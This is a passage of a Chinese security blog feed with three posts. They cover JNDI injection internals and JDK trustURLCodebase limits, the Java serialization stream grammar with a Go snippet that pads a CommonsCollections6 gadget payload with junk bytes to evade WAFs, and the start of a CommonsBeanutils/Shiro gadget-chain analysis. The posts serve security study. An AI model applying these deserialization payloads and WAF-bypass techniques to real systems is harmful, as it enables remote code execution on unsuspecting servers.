class="hljs-literal">null</span>;<br>           <span class="hljs-comment">//判断reference对象是否为Reference</span><br>           <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>                <span class="hljs-comment">//转换为Reference类型</span><br>               ref = (Reference) refInfo;<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>               ref = ((Referenceable)(refInfo)).getReference();<br>           &#125;<br><br>           Object answer;<br>           <span class="hljs-comment">//reference对象是否为空</span><br>           <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//获取工厂类名Exp</span><br>               <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>               <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br>                   <span class="hljs-comment">//根据工厂类远程获取对象引用</span><br>                   factory = getObjectFactoryFromReference(ref, f);<br>                   <span class="hljs-keyword">if</span> (factory <span class="hljs-keyword">instanceof</span> DirObjectFactory) &#123;<br>                       <span class="hljs-keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(<br>                           ref, name, nameCtx, environment, attrs);<br>                   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                       <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                        environment);<br>                   &#125;<br>                   <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>                   <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>                   <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>                   <span class="hljs-keyword">return</span> refInfo;<br><br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>                   <span class="hljs-comment">// containing URLs</span><br>                   <span class="hljs-comment">// ignore name &amp; attrs params; not used in URL factory</span><br><br>                   answer = processURLAddrs(ref, name, nameCtx, environment);<br>                   <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                       <span class="hljs-keyword">return</span> answer;<br>                   &#125;<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// try using any specified factories</span><br>           answer = createObjectFromFactories(refInfo, name, nameCtx,<br>                                              environment, attrs);<br>           <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br><br>   &#125;<br></code></pre></td></tr></table></figure><p><code>getObjectInstance</code>方法将<code>reference</code>对象转换为<code>Reference</code>类型并判断<code>reference</code>对象是否为空，如果不为空则从<code>reference</code>引用中获取工厂类<code>Exp</code>名字，接着调用<code>getObjectFactoryFromReference</code>方法根据工厂类Exp名字获取远程调用对象。</p><p><code>getObjectFactoryFromReference</code>方法实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> ObjectFactory <span class="hljs-title function_">getObjectFactoryFromReference</span><span class="hljs-params">(Reference ref, String factoryName)</span> <span class="hljs-keyword">throws</span> IllegalAccessException,InstantiationException, MalformedURLException &#123;<br>    Class&lt;?&gt; clas = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-comment">// Try to use current class loader</span><br>    <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-comment">//尝试先在本地加载Exp类</span><br>         clas = helper.loadClass(factoryName);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        <span class="hljs-comment">// ignore and continue</span><br>        <span class="hljs-comment">// e.printStackTrace();</span><br>    &#125;<br>    <span class="hljs-comment">// All other exceptions are passed up.</span><br><br>    <span class="hljs-comment">// Not in class path; try to use codebase</span><br>    String codebase;<br>    <span class="hljs-comment">//获取远程地址</span><br>    <span class="hljs-keyword">if</span> (clas == <span class="hljs-literal">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//loadClass方法远程加载Exp类</span><br>            clas = helper.loadClass(factoryName, codebase);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (clas != <span class="hljs-literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/e81b0bd5-336c-4141-8925-dc09a0ccfa3d.png" alt="ldap_low6.png"> </p><p>可以看到<code>LDAP</code>服务跟<code>jndi</code>一样，会尝试先在本地查找加载<code>Exp</code>类，如果本地没有找到<code>Exp</code>类，那么<code>getFactoryClassLocation</code>方法会获取远程加载的<code>url</code>地址，如果不为空则根据远程<code>url</code>地址使用类加载器<code>URLClassLoader</code>来加载<code>Exp</code>类，通过分析发现<code>LDAP</code>服务的整个利用流程都没有<code>URLCodebase</code>限制。<br>看一下整个调用站栈</p><p><img src="D:/mdimage/b956cc02-77f5-47b0-91fb-b50bd619731e.png" alt="ldap_low7.png"> </p><p><a href="https://tttang.com/archive/1611/#toc__2">JNDI注入分析 - 跳跳糖 (tttang.com)</a></p><p><a href="https://paper.seebug.org/942/#2-rmi-jndi-reference-payload">如何绕过高版本 JDK 的限制进行 JNDI 注入利用 (seebug.org)</a></p><p>后面这块没搞明白了，挖个坑</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>JDK 5U45</code>、<code>6U45</code>、<code>7u21</code>、<code>8u121</code> 开始 <code>java.rmi.server.useCodebaseOnly</code> 默认配置为<code>true</code></li><li><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code></li><li><code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code> 开始 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认为<code>false</code></li></ul><p>由于<code>JNDI</code>注入动态加载的原理是使用<code>Reference</code>引用<code>Object Factory</code>类，其内部在上文中也分析到了使用的是<code>URLClassLoader</code>，所以不受<code>java.rmi.server.useCodebaseOnly=false</code>属性的限制。<br>但是不可避免的受到 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>的限制。</p><p>所以，<code>JNDI-RMI</code>注入方式有： <code>codebase</code>(<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code>之前可以)  </p><p>利用本地<code>Class Factory</code>作为<code>Reference Factory</code></p><p><code>JNDI-LDAP</code>注入方式： <code>codebase</code>(<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之前可以) </p><p> <code>serialize</code>（两个切入点）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化协议构造与分析</title>
    <link href="/Decemberus.github-io/2022/12/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <url>/Decemberus.github-io/2022/12/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化协议构造与分析"><a href="#Java反序列化协议构造与分析" class="headerlink" title="Java反序列化协议构造与分析"></a>Java反序列化协议构造与分析</h1><p>首先我们需要理解这个Grammer：<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Java Object Serialization Specification: 6 - Object Serialization Stream Protocol (oracle.com)</a></p><h2 id="初步理解反序列化"><a href="#初步理解反序列化" class="headerlink" title="初步理解反序列化"></a>初步理解反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">stream:<br>magic version contents<br>contents:<br>content<br>contents content<br>content:<br>object<br>blockdata<br>object:<br>newObject<br>newClass<br>newArray<br>newString<br>newEnum<br>newClassDesc<br>prevObject<br>nullReference<br>exception<br>TC_RESET<br></code></pre></td></tr></table></figure><p>这是一个依次展开的巴科斯范式。我们从第一个stream开始看起，stream就是指完整的序列化协议流，</p><p>它是有三部分组成：magic、version和contents。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_MAGIC = (<span class="hljs-type">short</span>)<span class="hljs-number">0xaced</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_VERSION = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>magic等于0xaced，version等于5，这两个变量都是short类型，也就是两个字节的整型。这也就是为什么我们说序列化协议流是以 \xAC\xED\x00\x05 开头的原因。</p><p>接着， contents 在下面两行定义。可见， contents 等于 content ，或者 contents content 。怎么理解呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">contents:<br>  content<br>  contents content<br></code></pre></td></tr></table></figure><p>这里实际上是一个简单的递归下降的规则， contents 可以由一个 content 组成，也可以由一个contents 与一个 content 组成，而后面这种情况里的 contents 又可以继续由这两种情况组成，最后形成编译原理里所谓的左递归。</p><p>我们不用理解这么复杂的内容，因为这个例子非常简单，所以我们很容易地可以理解为： <strong>contents 是有一个或多个content 组成。</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attribute">content</span>:<br>  <span class="hljs-selector-tag">object</span><br>  blockdata<br></code></pre></td></tr></table></figure><p>content又是由object和blockdata组成</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe">object:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Object</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Class</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Array</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">String</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Enum</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  prevObject<br>  nullReference<span class="hljs-comment">//表示一个null</span><br>  exception<br>  TC_RESET<span class="hljs-comment">//重置Reference ID</span><br></code></pre></td></tr></table></figure><p>要重点区分一下对象<code>newObject</code>,类<code>newClass</code>,类定义<code>newClassDesc</code></p><p>这里对象和类的区别，就是前者是一个类实例化的对象，而后者就是这个类本身</p><p><code>newObject</code>和<code>newClass</code>的Grammer也需好好关注</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span><span class="hljs-type">Class</span>:<br>  TC_CLASS classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span><br><br>classDesc:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  nullReference<br>  (ClassDesc)prevObject      <span class="hljs-comment">// an object required to be of type</span><br>                             <span class="hljs-comment">// ClassDesc</span><br>                             <br><span class="hljs-keyword">new</span><span class="hljs-type">Object</span>:<br>  TC_OBJECT classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> classdata[]  <span class="hljs-comment">// data for each class</span><br></code></pre></td></tr></table></figure><p>可见， <code>newObject</code> 和 <code>newClass</code> 都是由一个标示符+ <code>classDesc</code> + <code>newHandle</code> 组成，只不过 <code>newObject</code>多一个 <code>classdata[]</code> 。原因是，它是一个对象，其包含了实例化类中的数据，这些数据就储存在<code>classdata[]</code> 中。</p><p><code>classDesc</code> 就是我们前面说的类定义，不过这个 <code>classDesc</code> 和前面的 <code>newClassDesc</code> 稍微有点区别，<code>classDesc</code> 可以是一个普通的 <code>newClassDesc</code> ，也可以是一个null，也可以是一个指针，指向任意前面已经出现过的其他的类定义。我们只要简单把 <code>classDesc</code> 理解为对 <code>newClassDesc</code> 的一个封装即可</p><p><code>newHandle</code> 是一个唯一ID，序列化协议里的每一个结构都拥有一个ID，这个ID由 0x7E0000 开始，每遇到下一个结构就+1，并设置成这个结构的唯一ID。而我前面说的 <code>prevObject</code> 指针，就是通过这个ID来定位它指向的结构。</p><p><strong>TC_的含义</strong></p><blockquote><p>在上面的代码解释中经常能看见TC_开头的一些参数，他主要是Type Code的缩写，表示一个字节标记的类型</p><p>在Java序列化中，数据流是按照块（Object、Array、Primitive Type）进行分割的。每个块都会以特定的标识符（Type Code）开头，用于标识这个块的类型。常见的Type Code包括：</p><ul><li>TC_OBJECT（对象）</li><li>TC_CLASSDESC（类描述符）</li><li>TC_ARRAY（数组）</li><li>TC_STRING（字符串）</li><li>TC_LONGSTRING（长字符串）</li><li>TC_NULL（null值）</li><li>TC_REFERENCE（引用）</li><li>TC_EXCEPTION（异常）</li><li>TC_BLOCKDATA（数据块）</li><li>TC_ENDBLOCKDATA（数据块结束）</li></ul><p>因此，”TC_”前缀可以让序列化器和反序列化器在处理数据流时快速识别块的类型，以便正确地解析数据。</p></blockquote><h2 id="序列化的解析成果"><a href="#序列化的解析成果" class="headerlink" title="序列化的解析成果"></a>序列化的解析成果</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> String name;<br>    <span class="hljs-keyword">protected</span>  User parent;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParent</span><span class="hljs-params">(User parent)</span><br>    &#123;<br>        <span class="hljs-built_in">this</span>.parent=parent;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">bob</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;bob&quot;</span>);<br>        bob.setParent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Josa&quot;</span>));<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(bob);<br>        System.out.println(Base64.encodeBase64String(byteArrayOutputStream.toByteArray()));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//输出</span><br>r<span class="hljs-meta">O0</span>ABX<span class="hljs-symbol">NyABd5</span>c<span class="hljs-number">29</span>zZXJpYWwucHJhY<span class="hljs-number">3</span>RpY<span class="hljs-number">2</span>UuVX<span class="hljs-symbol">NlcpHNaOa2</span><span class="hljs-symbol">n6</span><span class="hljs-name">m0</span>AgACTAAEbmFtZXQAEkxqYXZhL<span class="hljs-number">2</span>xhbmcvU<span class="hljs-number">3</span>RyaW<span class="hljs-number">5</span><span class="hljs-symbol">nO0</span>wAB<span class="hljs-symbol">nBhcmVudHQAGUx5</span>c<span class="hljs-number">29</span>zZXJpYWw<span class="hljs-attr">vcHJhY3</span>RpY<span class="hljs-number">2</span>UvVX<span class="hljs-symbol">Nlcjt4</span>cHQAA<span class="hljs-number">2</span>JvY<span class="hljs-symbol">nNxAH4</span>AAHQABEp<span class="hljs-attr">vc2</span>Fw<br></code></pre></td></tr></table></figure><p>将得到的Base64的数据流用zkar进行分析</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258792.png" alt="image-20230223224253392"> </p><p>可见，这里 contents 只包含一个 newObject ，其第一部分是 ClassDesc ，包含了User这个类的信息，比如类名、SerialVersionUID、父类、属性列表等。</p><p>这个 classDesc 的ID就是8257536，而在 []classData 数组中，包含两个属性， name 和 parent ，parent 也是一个 newObject ，它实际上在源码中是一个User类对象，所以 classDesc 也是User类的信息，因为前面已经定义过了，所以这个类是一个Reference，ID也是8257536，表示指向前面User类的ClassDesc。</p><p>通过这个简单的案例，我们可以理解Java是怎么序列化一个类的。当然，实际情况会比这个例子要复杂很多，但我们只需要按照Grammer中的语法进行分析，再结合zkar的执行结果，即可很好地理解序列化协议了</p><h2 id="构造包含垃圾的序列化流"><a href="#构造包含垃圾的序列化流" class="headerlink" title="构造包含垃圾的序列化流"></a>构造包含垃圾的序列化流</h2><h3 id="C0ny"><a href="#C0ny" class="headerlink" title="C0ny"></a>C0ny</h3><p>先来看看c0ny师傅的大体思路</p><p>思路是需要找到一个class可以序列化，它可以把我们的脏数据对象和ysoserial gadget对象一起包裹起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class A&#123;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10000</span>]&#123;<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12.</span>....&#125;<br>.....<br>yso Gadget<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们要找的class，第一需要实现java.io.Serializable接口，第二可以存储任意对象。这么看来集合类型就非常符合我们的需求。</p><ol><li><p>ArrayList</p></li><li><p>LinkedList</p></li><li><p>HashMap</p></li></ol><p>…..</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258276.png" alt="image-20230223230550344"> </p><p>所以我们可以改造ysoserial</p><p>大致的流程调用是，构造函数传入gadget对象以及垃圾数据长度，然后调用doWrap方法随机创建一个集合类型把随机生成的脏数据和gadget对象存储起来，最终序列化该对象即可拿到bypass WAF的序列化数据。具体实现参考<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">代码和注释</a></p><p>完整的项目看这个</p><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据 (qq.com)</a></p><h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>c0ny师傅的大体思路就是把Gadget和脏数据一起放入一个集合对象中</p><p>但是还有其他的操作</p><p>content是由object和blockdata组成，而blockdata是一个适合用来填充藏</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">content:<br>object<br>blockdata<br><br>blockdata:<br>blockdatashort<br>blockdatalong<br><br>blockdatashort:<br><span class="hljs-built_in">TC_BLOCKDATA</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">byte</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br><br>blockdatalong:<br><span class="hljs-built_in">TC_BLOCKDATALONG</span> (<span class="hljs-type">int</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br></code></pre></td></tr></table></figure><p>我们选择<code>blockdatalong</code></p><p>我们编写一个简单的Go程序，并调用zkar库中的结构和方法，来构造这个填充了垃圾字符的CommonsCollections6的Payload：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;cc6.ser&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_BLOCKDATALONG,<br>BlockData: &amp;serz.TCBlockData&#123;<br>Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>&#125;,<br>&#125;<br>serialization.Contents = <span class="hljs-built_in">append</span>(serialization.Contents, blockData)<br>ioutil.WriteFile(<span class="hljs-string">&quot;cc6-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CB与无依赖shiro利用链</title>
    <link href="/Decemberus.github-io/2022/12/03/CommonsBeanutils%E4%B8%8E%E6%97%A0%E4%BE%9D%E8%B5%96shiro%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/Decemberus.github-io/2022/12/03/CommonsBeanutils%E4%B8%8E%E6%97%A0%E4%BE%9D%E8%B5%96shiro%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h1><p><code>java.util.PriorityQueue</code>可以利用Comparator的compare()方法，接下来我们需要寻找能否找到其他可以利用的<code>java.util.Comparator</code></p><h2 id="JavaBean的简单回顾"><a href="#JavaBean的简单回顾" class="headerlink" title="JavaBean的简单回顾"></a>JavaBean的简单回顾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;catalina&quot;</span>;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单来说就是含有getter和setter两个方法的类</p><p>commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(), <span class="hljs-string">&quot;name&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时，commons-beanutils会自动找到name属性的getter方法，也就是 getName ，然后调用，获得返回值。除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p><h2 id="getter的妙用"><a href="#getter的妙用" class="headerlink" title="getter的妙用"></a>getter的妙用</h2><p>我们需要找可以利用的 java.util.Comparator 对象，在commons-beanutils包中就存在一个： <code>org.apache.commons.beanutils.BeanComparator</code> 。</p><p><code>BeanComparator</code> 是<code>commons-beanutils</code>提供的用来比较两个JavaBean是否相等的类，其实现了<code>java.util.Comparator</code> 接口。我们看它的compare方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">( T o1, T o2 )</span> &#123;<br><br>    <span class="hljs-keyword">if</span> ( property == <span class="hljs-literal">null</span> ) &#123;<br>        <span class="hljs-comment">// compare the actual objects</span><br>        <span class="hljs-keyword">return</span> internalCompare( o1, o2 );<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o1, property );<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o2, property );<br>        <span class="hljs-keyword">return</span> internalCompare( value1, value2 );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( IllegalAccessException iae ) 